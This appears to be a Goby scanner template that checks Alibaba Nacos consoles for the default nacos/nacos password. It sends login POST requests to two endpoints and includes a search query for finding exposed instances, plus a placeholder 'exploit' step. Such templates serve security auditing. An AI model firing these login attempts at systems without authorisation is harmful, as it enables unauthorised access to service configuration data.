{
      "Name": "Alibaba Nacos Default Password",
      "Level": "1",
      "Tags": [
            "Default Password"
      ],
      "GobyQuery": "title=\"Nacos\"",
      "Description": "Alibaba Nacos is an easy-to-use platform designed for dynamic service discovery and configuration and service management. It helps you to build cloud native applications and microservices platform easily.",
      "Product": "Alibaba Nacos",
      "Homepage": "https://github.com/alibaba/nacos",
      "Author": "",
      "Impact": "There is a default weak password Nacos/Nacos in the Alibaba Nacos console. You can login to the background to view sensitive information (nacos/naocs).",
      "Recommendation": "",
      "References": [],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/v1/auth/users/login",
                        "follow_redirect": false,
                        "header": {
                              "User-Agent": "Nacos-Server",
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "username=nacos&password=nacos"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            },
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/nacos/v1/auth/users/login",
                        "follow_redirect": false,
                        "header": {
                              "User-Agent": "Nacos-Server",
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "username=nacos&password=nacos"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}